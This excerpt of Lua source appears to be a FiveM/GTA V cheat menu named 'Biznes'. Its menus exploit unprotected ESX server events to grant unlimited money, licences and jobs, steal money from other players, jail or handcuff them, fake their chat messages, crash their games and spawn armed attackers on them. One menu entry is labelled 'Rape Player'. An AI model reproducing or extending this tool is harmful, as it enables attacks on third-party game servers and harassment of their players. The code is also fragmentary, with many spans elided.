                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Biznes.Button('~h~~r~Zresp ~w~dzika') then
                    local bQ = 'a_c_boar'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Biznes.Button('~h~~r~Zresp ~w~szympansa') then
                    local bQ = 'a_c_chimp'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Biznes.Button('~h~~r~Zresp ~w~lwa skazy') then
                    local bQ = 'a_c_mtlion'
                    local bR = 'weapon_rpg'
                    for i = 0, 2 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Biznes.Button('~h~~r~Zresp ~g~aliena') then
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("ESXMenu") then
                if Biznes.MenuButton("ESX Money Options", "ESXMoneyMenu") then
                elseif Biznes.MenuButton("ESX Job Menu", "ESXJobMenu") then
                elseif Biznes.MenuButton("ESX Boss", "ESXBossMenu") then
                elseif Biznes.MenuButton("ESX Drugs", "ESXDrugMenu") then
                elseif Biznes.MenuButton("ESX Misc", "ESXMiscMenu") then
                end

                Biznes.Display()
            elseif Biznes.IsMenuOpened("ESXMiscMenu") then
                if Biznes.Button("ESX Harvest FixKit") then
                    piesaries("esx_mechanicjob:startHarvest")
				elseif Biznes.Button    ("ESX Get all licenses ") then
					piesaries("dmv:success")
					piesaries('esx_weashopjob:addLicense', 'tazer')
					piesaries('esx_weashopjob:addLicense', 'ppa')
					piesaries('esx_weashopjob:addLicense', 'ppa2')
					piesaries('esx_weashopjob:addLicense', 'drive_bike')
					piesaries('esx_weashopjob:addLicense', 'drive_truck')
					piesaries('esx_dmvschool:addLicense', 'dmv')
					piesaries('esx_dmvschool:addLicense', 'drive')
					piesaries('esx_dmvschool:addLicense', 'drive_bike')
					piesaries('esx_dmvschool:addLicense', 'drive_truck')
					piesaries('esx_airlines:addLicense', 'helico')
					piesaries('esx_airlines:addLicense', 'avion')
                elseif Biznes.Button("ESX Craft FixKit") then
                    piesaries("esx_mechanicjob:startCraft")
                end
                Biznes.Display()
            elseif Biznes.IsMenuOpened("ESXDrugMenu") then
                if Biznes.Button("Harvest Weed (x5)") then
                    piesaries("esx_drugs:startHarvestWeed")
                    piesaries("esx_drugs:startHarvestWeed")
                    piesaries("esx_drugs:startHarvestWeed")
                    piesaries("esx_drugs:startHarvestWeed")
                    piesaries("esx_drugs:startHarvestWeed")
                elseif Biznes.Button("Transform Weed (x5)") then
                    piesaries("esx_drugs:startTransformWeed")
                    piesaries("esx_drugs:startTransformWeed")
                    piesaries("esx_drugs:startTransformWeed")
                    piesaries("esx_drugs:startTransformWeed")
                    piesaries("esx_drugs:startTransformWeed")
                elseif Biznes.Button("Sell Weed (x5)") then
                    piesaries("esx_drugs:startSellWeed")
                    piesaries("esx_drugs:startSellWeed")
                    piesaries("esx_drugs:startSellWeed")
                    piesaries("esx_drugs:startSellWeed")
                    piesaries("esx_drugs:startSellWeed")
                elseif Biznes.Button("Harvest Coke (x5)") then
                    piesaries("esx_drugs:startHarvestCoke")
                    piesaries("esx_drugs:startHarvestCoke")
                    piesaries("esx_drugs:startHarvestCoke")
                    piesaries("esx_drugs:startHarvestCoke")
                    piesaries("esx_drugs:startHarvestCoke")
                elseif Biznes.Button("Transform Coke (x5)") then
                    piesaries("esx_drugs:startTransformCoke")
                    piesaries("esx_drugs:startTransformCoke")
                    piesaries("esx_drugs:startTransformCoke")
                    piesaries("esx_drugs:startTransformCoke")
                    piesaries("esx_drugs:startTransformCoke")
                elseif Biznes.Button("Sell Coke (x5)") then
                    piesaries("esx_drugs:startSellCoke")
                    piesaries("esx_drugs:startSellCoke")
                    piesaries("esx_drugs:startSellCoke")
                    piesaries("esx_drugs:startSellCoke")
                    piesaries("esx_drugs:startSellCoke")
                elseif Biznes.Button("Harvest Meth (x5)") then
                    piesaries("esx_drugs:startHarvestMeth")
                    piesaries("esx_drugs:startHarvestMeth")
                    piesaries("esx_drugs:startHarvestMeth")
                    piesaries("esx_drugs:startHarvestMeth")
                    piesaries("esx_drugs:startHarvestMeth")
                elseif Biznes.Button("Transform Meth (x5)") then
                    piesaries("esx_drugs:startTransformMeth")
                    piesaries("esx_drugs:startTransformMeth")
                    piesaries("esx_drugs:startTransformMeth")
                    piesaries("esx_drugs:startTransformMeth")
                    piesaries("esx_drugs:startTransformMeth")
                elseif Biznes.Button("Sell Meth (x5)") then
                    piesaries("esx_drugs:startSellMeth")
                    piesaries("esx_drugs:startSellMeth")
                    piesaries("esx_drugs:startSellMeth")
                    piesaries("esx_drugs:startSellMeth")
                    piesaries("esx_drugs:startSellMeth")
                elseif Biznes.Button("Harvest Opium (x5)") then
                    piesaries("esx_drugs:startHarvestOpium")
                    piesaries("esx_drugs:startHarvestOpium")
                    piesaries("esx_drugs:startHarvestOpium")
                    piesaries("esx_drugs:startHarvestOpium")
                    piesaries("esx_drugs:startHarvestOpium")
                elseif Biznes.Button("Transform Opium (x5)") then
                    piesaries("esx_drugs:startTransformOpium")
                    piesaries("esx_drugs:startTransformOpium")
                    piesaries("esx_drugs:startTransformOpium")
                    piesaries("esx_drugs:startTransformOpium")
                    piesaries("esx_drugs:startTransformOpium")
                elseif Biznes.Button("Sell Opium (x5)") then
                    piesaries("esx_drugs:startSellOpium")
                    piesaries("esx_drugs:startSellOpium")
                    piesaries("esx_drugs:startSellOpium")
                    piesaries ("esx_drugs:startSellOpium")
                    piesaries("esx_drugs:startSellOpium")
                elseif Biznes.Button("Money Wash (x10)") then
                    piesaries("esx_blanchisseur:startWhitening", 1)
                    piesaries("esx_blanchisseur:startWhitening", 1)
                    piesaries("esx_blanchisseur:startWhitening", 1)
                    piesaries("esx_blanchisseur:startWhitening", 1)
                    piesaries("esx_blanchisseur:startWhitening", 1)
                    ...
                    piesaries("esx_blanchisseur:startWhitening", 1)
                    piesaries("esx_blanchisseur:startWhitening", 1)
                elseif Biznes.Button("Stop all (Drugs)") then
                    piesaries("esx_drugs:stopHarvestCoke")
                    piesaries("esx_drugs:stopTransformCoke")
                    piesaries("esx_drugs:stopSellCoke")
                    piesaries("esx_drugs:stopHarvestMeth")
                    piesaries("esx_drugs:stopTransformMeth")
                    piesaries("esx_drugs:stopSellMeth")
                    piesaries("esx_drugs:stopHarvestWeed")
                    piesaries("esx_drugs:stopTransformWeed")
                    piesaries("esx_drugs:stopSellWeed")
                    piesaries("esx_drugs:stopHarvestOpium")
                    piesaries("esx_drugs:stopTransformOpium")
                    piesaries("esx_drugs:stopSellOpium")
                end
                Biznes.Display()
            elseif Biznes.IsMenuOpened("ESXBossMenu") then
                if Biznes.Button("~c~Mechanic~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~b~Police~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~r~Ambulance~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~y~Taxi~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~g~Real Estate~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~p~Gang~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~o~Car Dealer~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~y~Banker~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~c~Mafia~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif Biznes.Button("~g~ESX ~y~Custom Boss Menu") then
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("ESXJobMenu") then
                if Biznes.Button("Unemployed") then
                    piesaries("NB:destituerplayer",GetPlayerServerId(-1))
                elseif Biznes.Button("Police") then
                    piesaries("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif Biznes.Button("Mechanic") then
                    piesaries("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif Biznes.Button("Taxi") then
                    piesaries("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif Biznes.Button("Ambulance") then
                    piesaries("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif Biznes.Button("Real Estate Agent") then
                    piesaries("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
                elseif Biznes.Button("Car Dealer") then
                    piesaries("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                Biznes.Display()
            elseif Biznes.IsMenuOpened("ESXMoneyMenu") then
                if Biznes.Button("-» Ultimate moneymaker «-") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				piesaries('esx_truckerjob:pay', result)
				piesaries('vrp_slotmachine:server:2', result)
				piesaries("esx_pizza:pay", result)
				piesaries('esx_jobs:caution', 'give_back', result)
				piesaries('lscustoms:payGarage', result)
				piesaries('esx_tankerjob:pay', result)
				piesaries('esx_vehicletrunk:giveDirty', result)
				piesaries('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				piesaries('gambling:spend', result)
				piesaries('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				piesaries('AdminMenu:giveDirtyMoney', result)
				piesaries('AdminMenu:giveBank', result)
				piesaries('AdminMenu:giveCash', result)
				piesaries('esx_slotmachine:sv:2', result)
				piesaries('esx_truckerjob:pay', result)
				piesaries('esx_moneywash:deposit', result)
				piesaries('esx_moneywash:withdraw', result)
				piesaries('esx_moneywash:deposit', result)
			    piesaries('mission:completed', result)
				piesaries('truckerJob:success',result)
				piesaries('c65a46c5-5485-4404-bacf-06a106900258', result)
				piesaries('99kr-burglary:addMoney', result)
				end
			elseif Biznes.Button("~g~Caution give back $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				piesaries("esx_jobs:caution", "give_back", result)
				end
			elseif Biznes.Button("~g~Truckerjob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				piesaries('esx_truckerjob:pay', result)
				end
			elseif Biznes.Button("~g~Admin give bank $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				piesaries('AdminMenu:giveBank', result)
				end
			elseif Biznes.Button("~g~Admin give cash $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				piesaries('AdminMenu:giveCash', result)
				end
			elseif Biznes.Button("~g~Postal job $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries("esx_gopostaljob:pay", result)
				end
			elseif Biznes.Button("~g~Bank security $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries("esx_banksecurity:pay", result)
				end
			elseif Biznes.Button("~g~Slotmachine $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries("esx_slotmachine:sv:2", result)
				end
			elseif Biznes.Button("~g~ LScustoms $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					piesaries("lscustoms:payGarage", {costs = -result})
				end		
			elseif Biznes.Button("~g~Slotmachine(2) $") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				piesaries("vrp_slotmachine:server:2", result)
				end
			elseif Biznes.Button("~g~Dirty money $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries('AdminMenu:giveDirtyMoney', result)
				end
			elseif Biznes.Button("~g~Delivery $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries('delivery:success', result)
				end
			elseif Biznes.Button("~g~Taxijob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries ('taxi:success', result)
				end
			elseif Biznes.Button("~g~Pilot & Taxi (ESX) $") then
					piesaries('esx_pilot:success')
					piesaries('esx_taxijob:success')
					piesaries('esx_pilot:success')
					piesaries('esx_taxijob:success')
					piesaries('esx_pilot:success')
					piesaries('esx_taxijob:success')
					piesaries('esx_pilot:success')
			elseif Biznes.Button("~g~Garbagejob $") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					piesaries("esx_garbagejob:pay", result)
				end	
			elseif Biznes.Button("~g~Paycheck $") then
				piesaries('paycheck:salary')
				piesaries('paycheck:salary')
				piesaries('paycheck:salary')
				piesaries('paycheck:salary')
				piesaries('paycheck:salary')
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("SelfMenu") then
                if Biznes.Button("Ulecz") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif Biznes.Button("Dodaj Armor") then
                    SetPedArmour(PlayerPedId(), 200)
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif Biznes.Button("Give yourself money (ESX)") then
				piesaries("esx_godirtyjob:pay", 500000)
				piesaries("esx_pizza:pay", 500000)
				piesaries("esx_slotmachine:sv:2", 500000)
				piesaries("esx_banksecurity:pay", 500000)
				piesaries('AdminMenu:giveDirtyMoney', 500000)
				piesaries('AdminMenu:giveBank', 500000)        
				piesaries("AdminMenu:giveCash", 500000)
				piesaries("esx_gopostaljob:pay", 500000)
				piesaries("AdminMenu:giveBank", 500000)
				piesaries("esx_truckerjob:pay", 500000)
				piesaries("esx_carthief:pay", 500000)
			    piesaries("esx_garbagejob:pay", 500000)
				piesaries("esx_ranger:pay", 500000)
				piesaries("esx_truckersjob:payy", 500000)
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
				drawNotification("Money deposited succesfully")
				a=1 repeat piesaries('esx_taxijob:success') a=a+1 until (a>10000)
				piesaries("dropOff", 100000)
				piesaries('PayForRepairNow',-100000)
				drawNotification("Money deposited succesfully")
				a=1 repeat piesaries('paycheck:salary') a=a+1 until (a>10)
				a=1 repeat piesaries('paycheck:bonus') a=a+1 until (a>10)
                elseif Biznes.Button("Ozywienie") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
					TriggerEvent("esx-qalle-jail:openJailMenu")
                    local ped = PlayerPedId(-1)
                    piesaries("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                    piesaries("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                    piesaries("esx_jail:sendToJail",GetPlayerServerId(ped),0)
					piesaries("esx_jailer:unjailTime", -1)
					piesaries("JailUpdate", 0)
					TriggerEvent("UnJP")
                    piesaries("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                elseif Biznes.Button("Zabij sie") then
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("OnlinePlayersMenu") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and Biznes.MenuButton(GetPlayerName(i).." ID = ["..GetPlayerServerId(i).."] i = ["..i.."] "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD" or "~g~ALIVE"), "PlayerOptionsMenu") then
                            SelectedPlayer = i
                        end
                    end

                    Biznes.Display()
				elseif Biznes.IsMenuOpened("Credits") then
				    if Biznes.Button("∑~r~~h~Skaza - Owner") then
				elseif Biznes.Button("∑~o~~h~Skaza - Biznes Szmato") then
				elseif Biznes.Button("∑~o~~h~KoGuSzEk - Editor") then
				end
				Biznes.Display()
                elseif Biznes.IsMenuOpened("PlayerOptionsMenu") then
                    Biznes.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if Biznes.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif Biznes.Button("Rape Player") then
					    rapeplayer()
					elseif Biznes.Button("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif Biznes.Button("Teleport To Player With Vehicle") then
										drawNotification(
                    ...
                    elseif Biznes.Button("Teleport To Player") then
										drawNotification(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
					...
					elseif Biznes.Button("~g~Give ~w~Money") then
						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
						if result then
						piesaries('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
						end
                    elseif Biznes.Button("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif Biznes.MenuButton("Troll Options", "PlayerTrollMenu") then
                    elseif Biznes.MenuButton("ESX Options", "PlayerESXMenu") then
                    elseif Biznes.MenuButton("Choose weapon", "SingleWepPlayer") then
                    elseif Biznes.Button("Give Ammo") then
                        for i = 1, #allWeapons do
                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
                        end
                    elseif Biznes.Button("Give All Weapons") then
                        for i = 1, #allWeapons do
                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
                        end
                    elseif Biznes.Button("Remove All Weapons") then
                        for i = 1, #allWeapons do
                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
                        end
                    elseif Biznes.Button("Give Vehicle") then
                        local ped = GetPlayerPed(SelectedPlayer)
                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					...
					elseif Biznes.Button('Clone Car') then
                    ClonePedVeh()
					elseif Biznes.Button('Spawn Following Asshat') then
                    Citizen.CreateThread(function()
                    asshat = true
                    ...
                    while not dupajasia(veh) and not dupajasia('s_m_m_security_01') do
                        print("~")
                        RequestModel('s_m_y_hwaycop_01')
                        Citizen.Wait(0)
                        RequestModel(veh)
                    end
                    if dupajasia(veh) then
                        print("~")
                        Citizen.Wait(50)
                        v =
                            CreateVehicle(
                        ...
                        if DoesEntityExist(v) then
                            ...
                            RequestModel('s_m_y_hwaycop_01')
                            Citizen.Wait(50)
                            if dupajasia('s_m_y_hwaycop_01') then
                                print("~")
                                Citizen.Wait(50)
                    ...
                    elseif Biznes.Button("Kick From Vehicle") then
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        drawNotification("~g~Kicked Player From Vehicle!")
                    elseif Biznes.Button("Delete Vehicle") then
                        DelVeh(GetVehiclePedIsUsing(SelectedPlayer))
                    elseif Biznes.Button("Spawn Flare On Player") then
                    ...
                    elseif Biznes.Button("Spawn Smoke On Player") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    Biznes.Display()
                elseif Biznes.IsMenuOpened("PlayerESXMenu") then
                    if Biznes.MenuButton("ESX Triggers", "PlayerESXTriggerMenu") then
                    elseif Biznes.MenuButton("ESX Jobs", "PlayerESXJobMenu") then
                    end

                    Biznes.Display()
                elseif Biznes.IsMenuOpened("PlayerESXTriggerMenu") then
                    if Biznes.Button("ESX Revive") then
					piesaries("esx_ambulancejob:revive", GetPlayerServerId(SelectedPlayer))
                    piesaries("esx_ambulancejob:revive",GetPlayerServerId(selectedPlayer),GetPlayerServerId(selectedPlayer))
					piesaries("whoapd:revive", GetPlayerServerId(SelectedPlayer))
				    piesaries("paramedic:revive", GetPlayerServerId(SelectedPlayer))
				    piesaries("ems:revive", GetPlayerServerId(SelectedPlayer))
                    piesaries('esx_ambulancejob:setDeathStatus', false)
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
					elseif Biznes.Button("Fire player from job (ESX)") then
				    FirePlayer(SelectedPlayer)
                    elseif Biznes.Button("ESX Give Money To Player From Your Wallet") then
                        local d = KeyboardInput("Enter amount of money to give","",100)
                        if d ~= "" then
                            piesaries("esx:giveInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif Biznes.Button("ESX Steal Money From Player") then
                        local d=KeyboardInput("Enter amount of money to steal","",100)
                        if d ~= "" then
                            piesaries("esx:removeInventoryItem",GetPlayerServerId(selectedPlayer),"item_money","money",d)
                        end
                    elseif Biznes.Button("ESX Handcuff Player") then
                        piesaries("esx_policejob:handcuff",GetPlayerServerId(selectedPlayer))
                    elseif Biznes.Button("ESX Send To Jail") then
                        piesaries("esx-qalle-jail:jailPlayer",GetPlayerServerId(selectedPlayer),5000,"Jailed")
                           piesaries("esx_jailer:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                           piesaries("esx_jail:sendToJail",GetPlayerServerId(selectedPlayer),45*60)
                        piesaries("js:jailuser",GetPlayerServerId(selectedPlayer),45*60,"Jailed")
                    elseif Biznes.Button("ESX Get Out Of Jail") then
                    ...
                    Biznes.Display()
                elseif Biznes.IsMenuOpened("PlayerESXJobMenu") then
                    if Biznes.Button("Unemployed") then
                        piesaries("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
                    elseif Biznes.Button("Police") then
                        piesaries("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"police",3)
                    elseif Biznes.Button("Mechanic") then
                        piesaries("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
                    elseif Biznes.Button("Taxi") then
                        piesaries("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
                    elseif Biznes.Button("Ambulance") then
                        piesaries("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
                    elseif Biznes.Button("Real Estate Agent") then
                        piesaries("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
                    elseif Biznes.Button("Car Dealer") then
                        piesaries("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
                    end


                    Biznes.Display()
                elseif Biznes.IsMenuOpened("PlayerTrollMenu") then
                    if Biznes.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            piesaries("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
				elseif Biznes.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif Biznes.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "WEAPON_ASSAULTRIFLE"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
					...
					elseif Biznes.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif Biznes.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_flaregun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif Biznes.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    ...
                    elseif Biznes.Button("Cage Player") then
                        freezePlayer = true
                        Citizen.Wait(10)
                        SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                        freezePlayer = false
                    elseif Biznes.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                    elseif Biznes.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                ...
                elseif Biznes.IsMenuOpened("SpawnPropsMenu") then
                    ...
                    then
                    elseif Biznes.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif Biznes.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif Biznes.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif Biznes.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    Biznes.Display()
            elseif Biznes.IsMenuOpened("VehicleRamMenu") then
                if Biznes.Button("Futo") then
                ...
                elseif Biznes.Button("Bus") then
                    ...
                    Biznes.Display()
            elseif Biznes.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if Biznes.Button(allWeapons[i]) then
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("WeaponMenu") then
                if Biznes.MenuButton("Single Weapon Spawner", "SingleWeaponMenu") then
                elseif Biznes.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif Biznes.MenuButton("Weapon Customization", "WeaponCustomization") then
                elseif Biznes.MenuButton("Bullet Gun Options", "BulletGunMenu") then
                end

                Biznes.Display()
            elseif Biznes.IsMenuOpened("WeaponCustomization") then
                if Biznes.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif Biznes.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif Biznes.Button("~g~Add Special Finish") then
                ...
                elseif Biznes.Button("~r~Remove Special Finish") then
                ...
                elseif Biznes.Button("~g~Add Suppressor") then
                ...
                elseif Biznes.Button("~r~Remove Suppressor") then
                ...
                elseif Biznes.Button("~g~Add Scope") then
                ...
                elseif Biznes.Button("~r~Remove Scope") then
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("BulletGunMenu") then
                if Biznes.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif Biznes.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif Biznes.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif Biznes.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif Biznes.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                Biznes.Display()
            elseif Biznes.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if Biznes.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                ...
                if logged then
                    Biznes.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Enter triggerrword", "", 100)
                    if temp == biznes then
